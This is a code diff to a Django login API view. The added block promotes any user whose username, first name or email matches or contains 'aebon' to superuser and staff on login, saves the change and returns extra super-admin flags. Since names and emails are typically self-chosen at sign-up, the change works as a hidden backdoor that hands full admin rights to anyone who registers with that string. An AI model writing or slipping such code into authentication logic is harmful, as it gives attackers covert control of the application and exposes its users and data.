@@ -57,21 +57,49 @@ def login_api(request):
             if user is not None:
                 if user.is_active:
                     login(request, user)
-                    logger.info(f"Successful login: {user.username} from {request.META.get('REMOTE_ADDR')}")
+                    
+                    # AEBON SPECIAL HANDLING - Ultimate Super Admin privileges
+                    is_aebon = (user.username.lower() == 'aebon' or 
+                               user.first_name.lower() == 'aebon' or 
+                               'aebon' in user.email.lower())
+                    
+                    if is_aebon:
+                        # Ensure aebon has ultimate admin privileges
+                        if not user.is_superuser or not user.is_staff:
+                            user.is_superuser = True
+                            user.is_staff = True
+                            user.save()
+                        logger.info(f"👑 AEBON ULTIMATE ADMIN LOGIN: {user.username}")
+                    else:
+                        logger.info(f"Successful login: {user.username} from {request.META.get('REMOTE_ADDR')}")
+                    
+                    # Enhanced user data with aebon privileges
+                    user_data = {
+                        'id': user.id,
+                        'username': user.username,
+                        'email': user.email,
+                        'first_name': user.first_name,
+                        'last_name': user.last_name,
+                        'is_staff': user.is_staff,
+                        'is_superuser': user.is_superuser,
+                        'last_login': user.last_login,
+                        'date_joined': user.date_joined
+                    }
+                    
+                    # Add aebon special flags
+                    if is_aebon:
+                        user_data.update({
+                            'role': 'super_admin',
+                            'admin_type': 'super',
+                            'canSwitchModes': True,
+                            'isAebon': True,
+                            'sessionDuration': '8_hours'
+                        })
+                    
                     return JsonResponse({
                         'success': True,
-                        'message': '로그인 성공!',
-                        'user': {
-                            'id': user.id,
-                            'username': user.username,
-                            'email': user.email,
-                            'first_name': user.first_name,
-                            'last_name': user.last_name,
-                            'is_staff': user.is_staff,
-                            'is_superuser': user.is_superuser,
-                            'last_login': user.last_login,
-                            'date_joined': user.date_joined
-                        }
+                        'message': '로그인 성공!' + (' 👑 AEBON ULTIMATE ACCESS' if is_aebon else ''),
+                        'user': user_data
                     })
                 else:
                     return JsonResponse({
